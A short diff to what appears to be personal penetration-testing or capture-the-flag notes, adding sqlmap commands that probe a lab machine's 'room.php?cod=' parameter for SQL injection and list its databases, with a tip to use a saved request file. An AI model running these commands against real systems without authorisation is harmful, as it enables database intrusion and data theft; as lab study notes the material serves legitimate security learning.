@@ -287,4 +287,9 @@ stty row <num> columns <cols>
 * We can use the command `whatweb [IP ADDRESS]` to see info about the web server.
 
 
- 
+ sqlmap -u "http://10.10.10.143/room.php?cod=1" --dbs 
+
+//Try to use this syntax instead (It's more reliable)
+sqlmap -r attack.txt --dbs   
+
+
